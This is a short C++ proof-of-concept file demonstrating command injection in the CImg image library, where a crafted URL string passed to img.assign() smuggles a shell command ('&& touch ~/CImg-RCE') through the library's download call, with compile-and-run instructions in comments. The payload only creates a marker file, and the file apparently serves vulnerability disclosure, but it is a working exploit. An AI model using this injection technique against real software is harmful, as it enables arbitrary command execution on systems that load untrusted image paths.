#undef cimg_display
#define cimg_display 0
#include "CImg.h"
using namespace cimg_library;

// To compile and run:
//
// g++ -I./CImg poc.c -o poc
// ./poc
//
// Notice that the file ~/CImg-RCE has now been created.

int main(int argc, char **argv) {
  const char *str = "https://i.pinimg.com/originals/da/25/51/da2551d47b8ae00fa7beb583bff53236.jpg\" && touch ~/CImg-RCE && echo \"";
  CImg<> img;
  img.assign(str);

  return 0;
}
